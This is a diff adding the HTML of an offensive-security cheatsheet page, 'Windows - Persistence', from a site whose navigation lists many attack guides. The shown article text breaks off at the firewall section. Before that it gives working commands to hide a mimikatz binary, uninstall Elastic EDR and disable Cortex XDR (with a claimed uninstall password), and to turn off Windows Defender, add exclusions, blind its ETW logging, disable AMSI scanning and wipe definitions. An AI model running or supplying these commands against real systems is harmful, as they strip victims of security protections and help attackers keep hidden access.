@@ -1,0 +1,2176 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Techniques and methodologies for maintaining access to Windows hosts after a successful security compromise.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Windows - Persistence" />
+<meta property="og:description" content="Techniques and methodologies for maintaining access to Windows hosts after a successful security compromise." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/windows_persistence/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-11-04T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-11-04T00:00:00+00:00" />
+<title>Windows - Persistence | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.afc3b3563d1884d85d5f5db04c9a930f7d7c354fdac44481534920d345015a5b.js" integrity="sha256-r8OzVj0YhNhdX12wTJqTD318NU/axESBU0kg00UBWls=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme_olympus/" class="">Olympus - TryHackMe Walkthrough</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/wordpress/" class="">Wordpress Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_persistence/" class="active">Windows - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/office_attacks/" class="">Attacking Office</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_discovery/" class="">Network Discovery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/mssql_server_cheatsheet/" class="">Pentesting MSSQL Server Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/source_code_management/" class="">Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/java_rmi/" class="">Java RMI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/kuburnetes/" class="">Kuburnetes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oauth/" class="">OAuth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/race_conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/saml_injection/" class="">SAML Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_template_injection/" class="">Server-Side Template Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/sql_injection/" class="">SQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/type_juggling/" class="">Type Juggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xss_injection/" class="">XSS Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Windows - Persistence</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#windows---persistence">Windows - Persistence</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#hide-your-binary">Hide Your Binary</a></li>
+        <li><a href="#disable-antivirus-and-security">Disable Antivirus and Security</a>
+          <ul>
+            <li><a href="#antivirus-removal">Antivirus Removal</a></li>
+            <li><a href="#disable-windows-defender">Disable Windows Defender</a></li>
+            <li><a href="#disable-windows-firewall">Disable Windows Firewall</a></li>
+            <li><a href="#clear-system-and-security-logs">Clear System and Security Logs</a></li>
+          </ul>
+        </li>
+        <li><a href="#simple-user">Simple User</a>
+          <ul>
+            <li><a href="#registry-hkcu">Registry HKCU</a></li>
+            <li><a href="#startup">Startup</a></li>
+            <li><a href="#scheduled-tasks-user">Scheduled Tasks User</a></li>
+            <li><a href="#bits-jobs">BITS Jobs</a></li>
+          </ul>
+        </li>
+        <li><a href="#serviceland">Serviceland</a>
+          <ul>
+            <li><a href="#iis">IIS</a></li>
+            <li><a href="#windows-service">Windows Service</a></li>
+          </ul>
+        </li>
+        <li><a href="#elevated">Elevated</a>
+          <ul>
+            <li><a href="#registry-hklm">Registry HKLM</a></li>
+            <li><a href="#startup-elevated">Startup Elevated</a></li>
+            <li><a href="#services-elevated">Services Elevated</a></li>
+            <li><a href="#scheduled-tasks-elevated">Scheduled Tasks Elevated</a></li>
+            <li><a href="#windows-management-instrumentation-event-subscription">Windows Management Instrumentation Event Subscription</a></li>
+            <li><a href="#binary-replacement">Binary Replacement</a></li>
+            <li><a href="#rdp-backdoor">RDP Backdoor</a></li>
+            <li><a href="#remote-desktop-services-shadowing">Remote Desktop Services Shadowing</a></li>
+            <li><a href="#skeleton-key">Skeleton Key</a></li>
+            <li><a href="#virtual-machines">Virtual Machines</a></li>
+          </ul>
+        </li>
+        <li><a href="#domain">Domain</a>
+          <ul>
+            <li><a href="#user-certificate">User Certificate</a></li>
+            <li><a href="#golden-certificate">Golden Certificate</a></li>
+            <li><a href="#golden-ticket">Golden Ticket</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="windows---persistence">
+  Windows - Persistence
+  <a class="anchor" href="#windows---persistence">#</a>
+</h1>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://github.com/fireeye/SharPersist">SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r</a></li>
+</ul>
+<h2 id="hide-your-binary">
+  Hide Your Binary
+  <a class="anchor" href="#hide-your-binary">#</a>
+</h2>
+<blockquote>
+<p>Sets (+) or clears (-) the Hidden file attribute. If a file uses this attribute set, you must clear the attribute before you can change any other attributes for the file.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>PS&gt; attrib +h mimikatz.exe
+</span></span></code></pre></div><h2 id="disable-antivirus-and-security">
+  Disable Antivirus and Security
+  <a class="anchor" href="#disable-antivirus-and-security">#</a>
+</h2>
+<h3 id="antivirus-removal">
+  Antivirus Removal
+  <a class="anchor" href="#antivirus-removal">#</a>
+</h3>
+<ul>
+<li>
+  <a href="https://github.com/ayeskatalas/Sophos-Removal-Tool/">Sophos Removal Tool.ps1</a></li>
+<li>
+  <a href="https://knowledge.broadcom.com/external/article/178870/download-the-cleanwipe-removal-tool-to-u.html">Symantec CleanWipe</a></li>
+<li>
+  <a href="https://www.elastic.co/guide/en/fleet/current/uninstall-elastic-agent.html">Elastic EDR/Security</a>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>cd <span style="color:#e6db74">&#34;C:\Program Files\Elastic\Agent\&#34;</span>
+</span></span><span style="display:flex;"><span>PS C:\Program Files\Elastic\Agent&gt; .\elastic-agent.exe uninstall
+</span></span><span style="display:flex;"><span>Elastic Agent will be uninstalled from your system at C:\Program Files\Elastic\Agent. <span style="color:#66d9ef">Do</span> you want to <span style="color:#66d9ef">continue</span>? [Y/n]<span style="color:#960050;background-color:#1e0010">:</span>Y
+</span></span><span style="display:flex;"><span>Elastic Agent has been uninstalled.
+</span></span></code></pre></div></li>
+<li>
+  <a href="https://mrd0x.com/cortex-xdr-analysis-and-bypass/">Cortex XDR</a>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Global uninstall password: Password1</span>
+</span></span><span style="display:flex;"><span>Password hash is located <span style="color:#66d9ef">in</span> C:\ProgramData\Cyvera\LocalSystem\Persistence\agent_settings.db
+</span></span><span style="display:flex;"><span>Look <span style="color:#66d9ef">for</span> PasswordHash, PasswordSalt or password, salt strings.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disable Cortex: Change the DLL to a random value, then REBOOT</span>
+</span></span><span style="display:flex;"><span>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disables the agent on startup (requires reboot to work)</span>
+</span></span><span style="display:flex;"><span>cytool.exe startup disable
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disables protection on Cortex XDR files, processes, registry and services</span>
+</span></span><span style="display:flex;"><span>cytool.exe protect disable
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disables Cortex XDR (Even with tamper protection enabled)</span>
+</span></span><span style="display:flex;"><span>cytool.exe runtime disable
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disables event collection</span>
+</span></span><span style="display:flex;"><span>cytool.exe event_collection disable
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="disable-windows-defender">
+  Disable Windows Defender
+  <a class="anchor" href="#disable-windows-defender">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Disable Defender</span>
+</span></span><span style="display:flex;"><span>sc config WinDefend start= disabled
+</span></span><span style="display:flex;"><span>sc stop WinDefend
+</span></span><span style="display:flex;"><span>Set-MpPreference -DisableRealtimeMonitoring $true
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Exclude a process / location</span>
+</span></span><span style="display:flex;"><span>Set-MpPreference -ExclusionProcess <span style="color:#e6db74">&#34;word.exe&#34;</span>, <span style="color:#e6db74">&#34;vmwp.exe&#34;</span>
+</span></span><span style="display:flex;"><span>Add-MpPreference -ExclusionProcess <span style="color:#e6db74">&#39;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#39;</span>
+</span></span><span style="display:flex;"><span>Add-MpPreference -ExclusionPath C:\Video, C:\install
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disable scanning all downloaded files and attachments, disable AMSI (reactive)</span>
+</span></span><span style="display:flex;"><span>PS C:\&gt; Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
+</span></span><span style="display:flex;"><span>PS C:\&gt; Set-MpPreference -DisableIOAVProtection $true
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disable AMSI (set to 0 to enable)</span>
+</span></span><span style="display:flex;"><span>PS C:\&gt; Set-MpPreference -DisableScriptScanning <span style="color:#ae81ff">1</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions</span>
+</span></span><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger&#34;</span> /v <span style="color:#e6db74">&#34;Start&#34;</span> /t REG_DWORD /d <span style="color:#e6db74">&#34;0&#34;</span> /f
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Wipe currently stored definitions</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Location of MpCmdRun.exe: C:\ProgramData\Microsoft\Windows Defender\Platform\&lt;antimalware platform version&gt;</span>
+</span></span><span style="display:flex;"><span>MpCmdRun.exe -RemoveDefinitions -All
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remove signatures (if Internet connection is present, they will be downloaded again):</span>
+</span></span><span style="display:flex;"><span>PS &gt; &amp; <span style="color:#e6db74">&#34;C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe&#34;</span> -RemoveDefinitions -All
+</span></span><span style="display:flex;"><span>PS &gt; &amp; <span style="color:#e6db74">&#34;C:\Program Files\Windows Defender\MpCmdRun.exe&#34;</span> -RemoveDefinitions -All
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disable Windows Defender Security Center</span>
+</span></span><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKLM\System\CurrentControlSet\Services\SecurityHealthService&#34;</span> /v <span style="color:#e6db74">&#34;Start&#34;</span> /t REG_DWORD /d <span style="color:#e6db74">&#34;4&#34;</span> /f
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disable Real Time Protection</span>
+</span></span><span style="display:flex;"><span>reg delete <span style="color:#e6db74">&#34;HKLM\Software\Policies\Microsoft\Windows Defender&#34;</span> /f
+</span></span><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKLM\Software\Policies\Microsoft\Windows Defender&#34;</span> /v <span style="color:#e6db74">&#34;DisableAntiSpyware&#34;</span> /t REG_DWORD /d <span style="color:#e6db74">&#34;1&#34;</span> /f
+</span></span><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKLM\Software\Policies\Microsoft\Windows Defender&#34;</span> /v <span style="color:#e6db74">&#34;DisableAntiVirus&#34;</span> /t REG_DWORD /d <span style="color:#e6db74">&#34;1&#34;</span> /f
+</span></span></code></pre></div><h3 id="disable-windows-firewall">
+  Disable Windows Firewall
